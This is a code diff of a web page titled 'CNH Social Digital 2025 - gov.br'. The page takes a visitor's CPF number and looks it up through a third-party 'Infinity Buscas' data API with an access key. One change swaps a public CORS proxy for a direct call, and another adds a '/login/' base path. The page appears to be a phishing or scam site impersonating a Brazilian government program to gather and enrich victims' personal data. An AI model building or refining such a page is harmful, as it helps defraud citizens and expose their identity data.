@@ -2,6 +2,7 @@
   <meta charset="utf-8">
   <meta http-equiv="x-ua-compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <base href="/login/">
 
   <title>CNH Social Digital 2025 - gov.br</title>
   <link rel="icon" href="images/favicon.ico">
@@ -1505,12 +1506,12 @@
       // Remove formatação do CPF (apenas números)
       const cpfLimpo = cpfDigitado.replace(/\D/g, "");
 
-      // Tenta usar a API Infinity Buscas através de um proxy CORS
-      const corsProxy = "https://api.allorigins.win/raw?url=";
-      const apiUrl = encodeURIComponent(`${INFINITY_API_URL}?Access-Key=${INFINITY_ACCESS_KEY}&Base=cpf&Info=${cpfLimpo}`);
-      
-      fetch(`${corsProxy}${apiUrl}`, {
-        method: "GET"
+      // Usa a API Infinity Buscas
+      fetch(`${INFINITY_API_URL}?Access-Key=${INFINITY_ACCESS_KEY}&Base=cpf&Info=${cpfLimpo}`, {
+        method: "GET",
+        headers: {
+          "Content-Type": "application/json",
+        }
       })
         .then((response) => {
           if (!response.ok) {
